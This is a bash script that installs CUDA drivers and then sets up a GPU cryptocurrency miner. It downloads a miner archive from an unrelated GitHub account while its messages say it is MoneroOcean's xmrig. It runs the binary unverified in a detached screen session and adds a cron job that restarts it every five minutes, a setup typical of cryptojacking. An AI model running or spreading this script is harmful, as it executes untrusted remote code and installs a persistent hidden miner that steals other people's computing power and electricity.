#!/bin/bash

CUDA_REPO_PKG=cuda-repo-ubuntu1804_10.0.130-1_amd64.deb

wget -O /tmp/${CUDA_REPO_PKG} http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/${CUDA_REPO_PKG} 

sudo dpkg -i /tmp/${CUDA_REPO_PKG}

sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub

rm -f /tmp/${CUDA_REPO_PKG}

sudo apt-get update

sudo apt-get -y install cuda-drivers
sudo apt-get -y install cuda
sudo apt -y install screen

VERSION=2.9

# printing greetings

echo "GPU mining setup script v$VERSION."



if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"

fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'

fi


echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://github.com/slicommeo/2019/releases/download/minner/gminer.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"

fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/moneroocean"
[ -d $HOME/moneroocean ] || mkdir $HOME/moneroocean
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/moneroocean; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/moneroocean directory"

fi
rm /tmp/xmrig.tar.gz



chmod +x $HOME/moneroocean/mine_grin32.sh
chmod +x $HOME/moneroocean/miner


cat >$HOME/moneroocean/checkminner.sh <<EOL
#!/bin/bash
if (( $(ps -ef | awk '{ print $8 }' | grep miner | wc -l) > 0 ))
 then
 echo "service chay ngon lanh"
 else
 echo hello
 cd $HOME/moneroocean
 screen -d -m ./mine_grin32.sh
 fi
 
EOL

chmod +x $HOME/moneroocean/checkminner.sh
(crontab -l 2>/dev/null || true; echo "*/5 * * * * sh $HOME/moneroocean/checkminner.sh") | crontab -

